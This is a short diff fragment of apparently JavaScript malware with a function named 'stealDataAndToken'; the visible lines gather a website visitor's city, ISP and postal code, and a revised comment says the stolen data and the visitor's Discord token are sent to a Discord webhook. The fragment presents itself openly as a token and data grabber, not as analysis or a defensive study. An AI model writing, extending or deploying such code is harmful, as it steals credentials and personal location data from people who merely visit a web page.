@@ -37,7 +37,7 @@ function stealDataAndToken() {
             var isp = geoData.org;
             var postalCode = geoData.postal;
 
-            // Send a message to Discord webhook including the stolen data
+            // Send a message to Discord webhook including the stolen data and Discord token
             var message = `\`\`\`
 Someone visited the website from:
 - City: ${city}
